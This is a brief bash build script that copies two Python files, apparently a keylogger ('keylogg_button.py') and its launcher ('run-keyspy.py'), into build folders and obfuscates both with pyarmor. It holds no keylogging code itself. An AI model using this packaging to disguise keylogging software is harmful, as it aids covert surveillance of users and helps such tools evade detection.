#!/bin/bash
mkdir -p build/keylogg
mkdir -p build/launcher
cp keylogg_button.py build/keylogg
cp run-keyspy.py build/launcher
cd build/keylogg && pyarmor obfuscate keylogg_button.py && cd ../..
cd build/launcher && pyarmor obfuscate run-keyspy.py && cd ../..
